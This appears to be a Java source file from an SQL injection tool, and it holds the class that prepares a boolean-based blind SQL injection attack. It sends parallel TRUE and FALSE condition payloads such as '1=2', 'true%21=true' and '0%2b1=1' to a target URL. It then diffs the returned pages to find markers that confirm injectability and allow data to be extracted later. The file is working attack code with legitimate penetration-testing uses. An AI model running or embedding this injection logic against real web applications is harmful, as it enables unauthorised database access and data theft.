package com.jsql.model.blind;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.model.blind.diff_match_patch.Diff;
import com.jsql.view.GUIMediator;

/**
 * A blind attack class using thread asynchronisation.
 */
public class ConcreteBlindInjection extends AbstractBlindInjection<BlindCallable> {
    /**
     * Source code of the TRUE web page (usually ?id=1).
     */
    private static String blankTrueMark;

    /**
     *  List of string differences found in all the FALSE queries, compared
     *  to the TRUE page (aka opcodes). Each FALSE pages should contain
     *  at least one same string, which shouldn't be present in all
     *  the TRUE queries.
     */
    private static List<Diff> constantFalseMark = new ArrayList<Diff>();

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(ConcreteBlindInjection.class);

    /**
     * Create blind attack initialisation.
     * If every false test are not in true mark and every true test are in
     * true test, then blind attack is confirmed.
     */
    public ConcreteBlindInjection() {

        // Call the SQL request which must be TRUE (usually ?id=1)
        ConcreteBlindInjection.blankTrueMark = ConcreteBlindInjection.callUrl("");

        /*
         * Every FALSE SQL statements will be checked,
         * more statements means a more robust application
         */
        String[] falseTest = {"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};

        /*
         * Every TRUE SQL statements will be checked,
         * more statements means a more robust application
         */
        String[] trueTest = {"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};

        // Check if the user wants to stop the preparation
        if (GUIMediator.model().stopFlag) {
            return;
        }

        /*
         *  Parallelize the call to the FALSE statements,
         *  it will use inject() from the model
         */
        ExecutorService executorFalseMark = Executors.newCachedThreadPool();
        Collection<BlindCallable> listCallableFalse = new ArrayList<BlindCallable>();
        for (String urlTest: falseTest) {
            listCallableFalse.add(new BlindCallable(urlTest));
        }
        
        // Begin the url requests
        List<Future<BlindCallable>> listFalseMark;
        try {
            listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
            return;
        }
        executorFalseMark.shutdown();

        /*
         * Delete junk from the results of FALSE statements,
         * keep only opcodes found in each and every FALSE pages.
         * Allow the user to stop the loop
         */
        try {
            constantFalseMark = listFalseMark.get(0).get().getOpcodes();
            for (Future<BlindCallable> falseMark: listFalseMark) {
                if (GUIMediator.model().stopFlag) {
                    return;
                }
                constantFalseMark.retainAll(falseMark.get().getOpcodes());
            }
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
        } catch (ExecutionException e) {
            LOGGER.error(e, e);
        }

        if (GUIMediator.model().stopFlag) {
            return;
        }

        /*
         *  Parallelize the call to the TRUE statements,
         *  it will use inject() from the model.
         */
        ExecutorService executorTrueMark = Executors.newCachedThreadPool();
        Collection<BlindCallable> listCallableTrue = new ArrayList<BlindCallable>();
        for (String urlTest: trueTest) {
            listCallableTrue.add(new BlindCallable(urlTest));
        }
        
        // Begin the url requests
        List<Future<BlindCallable>> listTrueMark;
        try {
            listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
            return;
        }
        executorTrueMark.shutdown();

        /*
         * Remove TRUE opcodes in the FALSE opcodes, because
         * a significant FALSE statement shouldn't contain any TRUE opcode.
         * Allow the user to stop the loop.
         */
        try {
            for (Future<BlindCallable> trueMark: listTrueMark) {
                if (GUIMediator.model().stopFlag) {
                    return;
                }
                ConcreteBlindInjection.constantFalseMark.removeAll(trueMark.get().getOpcodes());
            }
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
        } catch (ExecutionException e) {
            LOGGER.error(e, e);
        }
    }

    @Override
    public BlindCallable getCallable(String string, int indexCharacter, boolean isLengthTest) {
        return new BlindCallable(string, indexCharacter, isLengthTest);
    }

    @Override
    public BlindCallable getCallable(String string, int indexCharacter, int bit) {
        return new BlindCallable(string, indexCharacter, bit);
    }

    /**
     * Start one test to verify if blind works.
     * @return true if blind method is confirmed
     * @throws PreparationException
     */
    public boolean isInjectable() throws PreparationException {
        if (GUIMediator.model().stopFlag) {
            throw new PreparationException();
        }

        BlindCallable blindTest = new BlindCallable("0%2b1=1");
        try {
            blindTest.call();
        } catch (Exception e) {
            LOGGER.error(e, e);
        }

        return blindTest.isTrue() && !ConcreteBlindInjection.constantFalseMark.isEmpty();
    }

    @Override
    public String getInfoMessage() {
        return "A blind SQL request is true if the diff between "
                + "a correct page (e.g existing id) and current page "
                + "is not as the following: "
                + ConcreteBlindInjection.constantFalseMark + "\n";
    }

    /**
     * Get source code of the TRUE web page.
     * @return Source code in HTML
     */
    public static String getBlankTrueMark() {
        return blankTrueMark;
    }
    
    /**
     *  Get False Marks.
     *  @return False marks
     */
    public static List<Diff> getConstantFalseMark() {
        return constantFalseMark;
    }
}